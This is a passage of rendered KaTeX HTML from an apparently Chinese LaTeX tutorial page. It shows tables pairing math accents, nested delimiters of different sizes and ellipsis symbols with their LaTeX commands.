preserveAspectRatio='xMaxYMin slice'><path d='M399994 0l6 6v35l-6 11c-56 104-135.3 181.3-238 232-57.3 28.7-117 45-179 50H-300V214h399897c43.3-7 81-15 113-26 100.7-33 179.7-91 237-174 2.7-5 6-9 10-13 .7-1 7.3-1 20-1h17z'/></svg></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.648em;"><span></span></span></span></span></span></span></span></span></td><td><code>\underbrace&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">→</mo></mover></mrow><annotation encoding="application/x-tex">\overrightarrow{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9525600000000001em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9525600000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="height:0.522em;min-width:0.888em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMaxYMin slice'><path d='M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z'/></svg></span></span></span></span></span></span></span></span></span></td><td><code>\overrightarrow&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">^</mo></mover></mrow><annotation encoding="application/x-tex">\widehat{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73056em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.73056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.3em;"><svg width='100%' height='0.3em' viewBox='0 0 2364 300' preserveAspectRatio='none'><path d='M1181 0h2l1171 176c6 0 10 5 10 11l-2 23c-1 6-5 10-11 10h-1L1182 67 15 220h-1c-6 0-10-4-11-10l-2-23c-1-6 4-11 10-11z'/></svg></span></span></span></span></span></span></span></span></span></td><td><code>\widehat&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder accentunder="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">→</mo></munder></mrow><annotation encoding="application/x-tex">\underrightarrow{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9525600000000001em;vertical-align:-0.522em;"></span><span class="mord accentunder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43056em;"><span class="svg-align" style="top:-2.4779999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="height:0.522em;min-width:0.888em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMaxYMin slice'><path d='M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z'/></svg></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.522em;"><span></span></span></span></span></span></span></span></span></td><td><code>\underrightarrow&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">~</mo></mover></mrow><annotation encoding="application/x-tex">\widetilde{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.71656em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.71656em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.286em;"><svg width='100%' height='0.286em' viewBox='0 0 1033 286' preserveAspectRatio='none'><path d='M344 55.266c-142 0-300.638 81.316-311.5 86.418-8.01 3.762-22.5 10.91-23.5 5.562L1 120c-1-2-1-3-1-4 0-5 3-9 8-10l18.4-9C160.9 31.9 283 0 358 0c148 0 188 122 331 122s314-97 326-97c4 0 8 2 10 7l7 21.114c1 2.14 1 3.21 1 4.28 0 5.347-3 9.626-7 10.696l-22.3 12.622C852.6 158.372 751 181.476 676 181.476c-149 0-189-126.21-332-126.21z'/></svg></span></span></span></span></span></span></span></span></span></td><td><code>\widetilde&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="false">(</mo><mo fence="false">(</mo><mo fence="false">(</mo><mo fence="false">(</mo><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo fence="false">)</mo><mo fence="false">)</mo><mo fence="false">)</mo><mo fence="false">)</mo></mrow><annotation encoding="application/x-tex">\Bigg( \bigg( \Big( \big((x) \big) \Big) \bigg) \Bigg)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mord"><span class="delimsizing size4">(</span></span><span class="mord"><span class="delimsizing size3">(</span></span><span class="mord"><span class="delimsizing size2">(</span></span><span class="mord"><span class="delimsizing size1">(</span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">)</span></span><span class="mord"><span class="delimsizing size2">)</span></span><span class="mord"><span class="delimsizing size3">)</span></span><span class="mord"><span class="delimsizing size4">)</span></span></span></span></span></td><td><code>$\Bigg( \bigg( \Big( \big((x) \big) \Big) \bigg) \Bigg)$</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="false">[</mo><mo fence="false">[</mo><mo fence="false">[</mo><mo fence="false">[</mo><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mo fence="false">]</mo><mo fence="false">]</mo><mo fence="false">]</mo><mo fence="false">]</mo></mrow><annotation encoding="application/x-tex">\Bigg[ \bigg[ \Big[ \big[[x] \big] \Big] \bigg] \Bigg]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mord"><span class="delimsizing size4">[</span></span><span class="mord"><span class="delimsizing size3">[</span></span><span class="mord"><span class="delimsizing size2">[</span></span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mopen">[</span><span class="mord mathdefault">x</span><span class="mclose">]</span><span class="mord"><span class="delimsizing size1">]</span></span><span class="mord"><span class="delimsizing size2">]</span></span><span class="mord"><span class="delimsizing size3">]</span></span><span class="mord"><span class="delimsizing size4">]</span></span></span></span></span></td><td><code>$\Bigg[ \bigg[ \Big[ \big[[x] \big] \Big] \bigg] \Bigg]$</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="false">{</mo><mo fence="false">{</mo><mo fence="false">{</mo><mo fence="false">{</mo><mo stretchy="false">{</mo><mi>x</mi><mo stretchy="false">}</mo><mo fence="false">}</mo><mo fence="false">}</mo><mo fence="false">}</mo><mo fence="false">}</mo></mrow><annotation encoding="application/x-tex">\Bigg\{ \bigg\{ \Big\{ \big\{\{x\} \big\} \Big\} \bigg\} \Bigg\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mord"><span class="delimsizing size4">{</span></span><span class="mord"><span class="delimsizing size3">{</span></span><span class="mord"><span class="delimsizing size2">{</span></span><span class="mord"><span class="delimsizing size1">{</span></span><span class="mopen">{</span><span class="mord mathdefault">x</span><span class="mclose">}</span><span class="mord"><span class="delimsizing size1">}</span></span><span class="mord"><span class="delimsizing size2">}</span></span><span class="mord"><span class="delimsizing size3">}</span></span><span class="mord"><span class="delimsizing size4">}</span></span></span></span></span></td><td><code>$\Bigg\&#123; \bigg\&#123; \Big\&#123; \big\&#123;\&#123;x\&#125; \big\&#125; \Big\&#125; \bigg\&#125; \Bigg\&#125;$</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="false">⟨</mo><mo fence="false">⟨</mo><mo fence="false">⟨</mo><mo fence="false">⟨</mo><mo stretchy="false">⟨</mo><mi>x</mi><mo stretchy="false">⟩</mo><mo fence="false">⟩</mo><mo fence="false">⟩</mo><mo fence="false">⟩</mo><mo fence="false">⟩</mo></mrow><annotation encoding="application/x-tex">\Bigg\langle \bigg\langle \Big\langle \big\langle\langle x \rangle \big\rangle \Big\rangle \bigg\rangle \Bigg\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="mord"><span class="delimsizing size4">⟨</span></span><span class="mord"><span class="delimsizing size3">⟨</span></span><span class="mord"><span class="delimsizing size2">⟨</span></span><span class="mord"><span class="delimsizing size1">⟨</span></span><span class="mopen">⟨</span><span class="mord mathdefault">x</span><span class="mclose">⟩</span><span class="mord"><span class="delimsizing size1">⟩</span></span><span class="mord"><span class="delimsizing size2">⟩</span></span><span class="mord"><span class="delimsizing size3">⟩</span></span><span class="mord"><span class="delimsizing size4">⟩</span></span></span></span></span></td><td><code>$\Bigg\langle \bigg\langle \Big\langle \big\langle\langle x \rangle \big\rangle \Big\rangle \bigg\rangle \Bigg\rangle$</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="false">∣</mo><mo fence="false">∣</mo><mo fence="false">∣</mo><mo fence="false">∣</mo><mo stretchy="false">∣</mo><mi>x</mi><mo stretchy="false">∣</mo><mo fence="false">∣</mo><mo fence="false">∣</mo><mo fence="false">∣</mo><mo fence="false">∣</mo></mrow><annotation encoding="application/x-tex">\Bigg\lvert \bigg\lvert \Big\lvert \big\lvert\lvert x \rvert \big\rvert \Big\rvert \bigg\rvert \Bigg\rvert</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.03em;vertical-align:-1.250025em;"></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7799749999999999em;"><span style="top:-1.355975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-1.9619749999999998em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.5679749999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.779975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.167985em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.561985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.167985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.86199em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86199em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mopen">∣</span><span class="mord mathdefault">x</span><span class="mclose">∣</span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.86199em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86199em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.167985em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.561985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.167985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7799749999999999em;"><span style="top:-1.355975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-1.9619749999999998em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.5679749999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.779975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span></span></span></span></td><td><code>$\Bigg\lvert \bigg\lvert \Big\lvert \big\lvert\lvert x \rvert \big\rvert \Big\rvert \bigg\rvert \Bigg\rvert$</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="false">∥</mo><mo fence="false">∥</mo><mo fence="false">∥</mo><mo fence="false">∥</mo><mo stretchy="false">∥</mo><mi>x</mi><mo stretchy="false">∥</mo><mo fence="false">∥</mo><mo fence="false">∥</mo><mo fence="false">∥</mo><mo fence="false">∥</mo></mrow><annotation encoding="application/x-tex">\Bigg\lVert\big\lVert\Big\lVert\big\lVert\lVert x \rVert \big\rVert\Big\rVert\bigg\rVert \Bigg\rVert</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.03em;vertical-align:-1.250025em;"></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7799749999999999em;"><span style="top:-1.355975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-1.9619749999999998em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.5679749999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.779975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.86199em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.86199em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.167985em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.561985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.167985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.86199em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.86199em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mopen">∥</span><span class="mord mathdefault">x</span><span class="mclose">∥</span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.86199em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.86199em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.167985em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.561985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.167985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7799749999999999em;"><span style="top:-1.355975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-1.9619749999999998em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.5679749999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.779975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.250025em;"><span></span></span></span></span></span></span></span></span></span></td><td><code>$\Bigg\lVert\big\lVert \Big\lVert \big\lVert \lVert x \rVert \big\rVert \Big\rVert \bigg\rVert \Bigg\rVert$</code></td></tr></tbody></table><h3 id="省略号"><a class="markdownIt-Anchor" href="#省略号"></a> 省略号</h3><ul><li>省略号用 \dots \cdots \vdots \ddots表示 ，\dots和\cdots的纵向位置不同，前者一般用于有下标的序列</li></ul><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>…</mo></mrow><annotation encoding="application/x-tex">\dots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.12em;vertical-align:0em;"></span><span class="minner">…</span></span></span></span></td><td><code>\dots</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⋯</mo></mrow><annotation encoding="application/x-tex">\cdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.31em;vertical-align:0em;"></span><span class="minner">⋯</span></span></span></span></td><td><code>\cdots</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mrow><annotation encoding="application/x-tex">\vdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.03em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span></span></td><td><code>\vdots</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⋱</mo></mrow><annotation encoding="application/x-tex">\ddots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.82em;vertical-align:0em;"></span><span class="minner">⋱</span></span></span></span></td><td><code>\ddots</code></td></tr></tbody></table><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mspace width="1em"/><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>n</mi><mspace width="1em"/><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded><mspace width="1em"/><mo>⋱</mo></mrow><annotation encoding="application/x-tex">x_1, x_2, \dots, x_n\quad 1,2,\cdots,n\quad \vdots\quad \ddots </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.69444em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="minner">⋱</span></span></span></span></span></p><h3 id="空白间距"><a class="markdownIt-Anchor" 